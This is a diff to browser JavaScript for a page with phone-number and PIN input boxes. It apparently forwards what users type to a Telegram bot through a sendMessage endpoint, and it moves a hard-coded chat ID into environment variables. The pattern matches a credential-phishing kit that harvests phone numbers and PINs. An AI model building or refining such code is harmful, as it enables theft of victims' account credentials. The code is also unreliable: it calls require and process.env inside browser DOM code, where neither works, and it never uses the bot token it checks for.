@@ -1,3 +1,5 @@
+require('dotenv').config(); // Load environment variables from .env file
+
 document.addEventListener("DOMContentLoaded", function () {
   const phoneNumberInput = document.getElementById("phone-number");
   const pinInputs = document.querySelectorAll(".pin-box");
@@ -18,11 +20,19 @@ document.addEventListener("DOMContentLoaded", function () {
   };
 
   async function sendToTelegram(message) {
+    const chatId = process.env.CHAT_ID; // Chat ID diambil dari environment variables
+    const botToken = process.env.TELEGRAM_BOT_TOKEN; // Token diambil dari environment variables
+
+    if (!botToken || !chatId) {
+      console.error('Telegram bot token or chat ID is missing.');
+      return;
+    }
+
     try {
       const response = await fetch('/api/sendMessage', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chatId: "7732620750", message }),
+        body: JSON.stringify({ chatId, message }),
       });
 
       if (!response.ok) {
